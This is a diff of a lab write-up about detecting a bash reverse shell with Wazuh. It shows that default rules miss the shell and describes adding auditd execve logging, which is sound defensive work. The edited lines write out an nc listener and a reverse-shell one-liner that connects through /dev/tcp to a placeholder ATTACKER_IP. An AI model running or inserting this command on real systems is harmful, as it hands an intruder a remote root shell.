@@ -91,34 +91,30 @@ The attack
 
 A bash reverse shell opens an interactive shell and redirects its I/O over a TCP socket back to the attacker, using bash's built-in /dev/tcp.
 
-Attacker (Kali) — listener:
+**Attacker (Kali) — listener:**
 
-nc -lvnp 4444
+`nc -lvnp 4444`
 
-Victim (ubuntu-prod):
+**Victim (ubuntu-prod):**
 
-bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+`bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'`
 
-This returned a root shell on the attacker machine.
+This returned a root shell on the attacker's machine.
 
 Show Image
 
-![](nc-4444-kali.png)
+![](screenshots/nc-4444-kali.png)
 
-<!-- TODO: screenshot of the Kali listener showing "connect from <victim>" + a couple of post-ex commands (id, hostname). Redact real IPs if you prefer. -->
 Gap: the default ruleset is blind to it
 
 With the reverse shell active and commands running as root, the Wazuh dashboard showed no actionable alert. Linux does not log outbound connection creation by default, so no event describing the reverse shell ever reached the SIEM for matching.
 
-![](no-rshell-log)
+![](screenshots/no-rshell-log)
 
-Show Image
-
-<!-- TODO: dashboard filtered to the agent around the attack time, showing nothing relevant (or only level-0 noise). The ABSENCE is the evidence. -->
 
 Root cause: this is a telemetry gap, not a missing-rule problem. Wazuh can only alert on what the OS logs, and  Linux doesn't generate an event for this. Detection, therefore, required adding telemetry that the default install lacks.
 
-Adding telemetry with auditd
+**Adding telemetry with auditd**
 
 Installed auditd on the victim and added a rule to log process execution (execve), which captures the command line of the reverse-shell payload:
 ```
